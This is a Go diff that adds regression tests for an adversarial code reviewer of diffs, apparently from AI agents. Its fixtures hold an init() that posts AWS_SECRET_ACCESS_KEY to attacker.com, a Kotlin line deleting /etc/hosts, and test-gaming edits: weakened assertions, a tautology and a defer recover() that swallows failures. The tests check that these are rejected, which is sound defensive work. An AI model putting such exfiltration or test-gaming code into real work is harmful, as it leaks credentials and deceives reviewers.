@@ -759,23 +759,168 @@ func TestR2_3_Reviewer_CoverageDropToZero_Rejected(t *testing.T) {
 	}
 }
 
-func TestR2_3_Reviewer_TestCountBeforeZero_MissingDataRejected(t *testing.T) {
+func TestR3_3_Kotlin_FileDelete_WithWarningFinding_RemainsUnreviewed(t *testing.T) {
 	rev := NewAdversarialReviewer(persona.NewRegistry(""))
 	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
 		return `{"approved": true, "blocking": [], "warnings": []}`, nil
 	})
+
 	ctx := &ReviewContext{
-		Ctx:               context.Background(),
-		Diff:              "diff --git a/pkg.go b/pkg.go\n...",
-		TestCountBefore:   0,
-		TestCountAfter:    0,
-		RequiresTestGates: true,
+		Ctx: context.Background(),
+		Diff: `diff --git a/App.kt b/App.kt
+--- a/App.kt
++++ b/App.kt
+@@ -1,3 +1,5 @@
+ package com.example
+ class App {
++    fun run() { java.io.File("/etc/hosts").delete() }
+ }
+`,
+		AnalyzerFindings: []AnalyzerFinding{
+			{Tool: "detekt", Message: "Naming convention warning", Severity: "WARNING"},
+		},
+		SemanticRunnerConfigured: false,
+		SemanticRunnerExecuted:   false,
 	}
+
 	verdict := rev.Evaluate(ctx)
 	if verdict.Approved {
-		t.Fatalf("expected missing test count metrics to fail closed, but approved")
+		t.Fatalf("R3-3 regression: 1 warning finding with no configured/executed runner flipped dangerous Kotlin diff to APPROVED!")
+	}
+	if verdict.Status != StatusUnreviewed && verdict.Status != StatusRejected {
+		t.Fatalf("expected StatusUnreviewed or StatusRejected, got: %s", verdict.Status)
 	}
 }
+
+func TestR3_3_Deterministic_WeakenedAssertion_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved": true, "blocking": [], "warnings": []}`, nil
+	})
+
+	ctx := &ReviewContext{
+		Ctx: context.Background(),
+		Diff: `diff --git a/pkg_test.go b/pkg_test.go
+--- a/pkg_test.go
++++ b/pkg_test.go
+@@ -10,2 +10,2 @@
+-	if len(items) != 3 {
+-		t.Fatal("expected 3 items")
++	if len(items) < 0 {
++		t.Fatal("expected items")
+ 	}
+`,
+		TestResults: []*sandbox.ExecResult{{Command: "go test ./...", ExitCode: 0}},
+	}
+
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected weakened impossible assertion 'len(items) < 0' to be REJECTED deterministically")
+	}
+}
+
+func TestR3_3_Deterministic_Tautology_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved": true, "blocking": [], "warnings": []}`, nil
+	})
+
+	ctx := &ReviewContext{
+		Ctx: context.Background(),
+		Diff: `diff --git a/pkg_test.go b/pkg_test.go
+--- a/pkg_test.go
++++ b/pkg_test.go
+@@ -10,3 +10,3 @@
+-	if actual != expected {
+-		t.Fatal("mismatch")
++	if 1 != 1 {
++		t.Fatal("mismatch")
+ 	}
+`,
+		TestResults: []*sandbox.ExecResult{{Command: "go test ./...", ExitCode: 0}},
+	}
+
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected tautology 'if 1 != 1' in test to be REJECTED deterministically")
+	}
+}
+
+func TestR3_3_Deterministic_DeferRecoverSwallowing_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved": true, "blocking": [], "warnings": []}`, nil
+	})
+
+	ctx := &ReviewContext{
+		Ctx: context.Background(),
+		Diff: `diff --git a/pkg_test.go b/pkg_test.go
+--- a/pkg_test.go
++++ b/pkg_test.go
+@@ -5,2 +5,3 @@
+ func TestRiskyFeature(t *testing.T) {
++	defer func() { recover() }()
+ 	t.Fatal("forced failure")
+ }
+`,
+		TestResults: []*sandbox.ExecResult{{Command: "go test ./...", ExitCode: 0}},
+	}
+
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected defer recover() swallowing test failures to be REJECTED deterministically")
+	}
+}
+
+func TestR3_3_Deterministic_ProductionInitSecretEgress_Rejected(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved": true, "blocking": [], "warnings": []}`, nil
+	})
+
+	ctx := &ReviewContext{
+		Ctx: context.Background(),
+		Diff: `diff --git a/service.go b/service.go
+--- a/service.go
++++ b/service.go
+@@ -1,3 +1,7 @@
+ package service
++import "net/http"
++import "os"
++func init() {
++	http.Post("https://attacker.com", "text/plain", strings.NewReader(os.Getenv("AWS_SECRET_ACCESS_KEY")))
++}
+`,
+		TestResults: []*sandbox.ExecResult{{Command: "go test ./...", ExitCode: 0}},
+	}
+
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected production init() secret access / network egress to be REJECTED deterministically")
+	}
+}
+
+func TestR3_3_ZeroBeforeCount_RequiresCriteriaTests_FailsClosed(t *testing.T) {
+	rev := NewAdversarialReviewer(persona.NewRegistry(""))
+	rev.SetCritic(func(ctx context.Context, prompt string) (string, error) {
+		return `{"approved": true, "blocking": [], "warnings": []}`, nil
+	})
+
+	ctx := &ReviewContext{
+		Ctx:             context.Background(),
+		Diff:            "diff --git a/service.go b/service.go\n...",
+		TestCountBefore: 0,
+		TestCountAfter:  0,
+		Criteria:        []string{"Scenario 1: Given user, When login, Then success"},
+		TestResults:     []*sandbox.ExecResult{{Command: "go test ./...", ExitCode: 0}},
+	}
+
+	verdict := rev.Evaluate(ctx)
+	if verdict.Approved {
+		t.Fatalf("expected TestCountBefore == 0 with zero new tests to fail closed when criteria exist")
+	}
+}
+
 
 
 
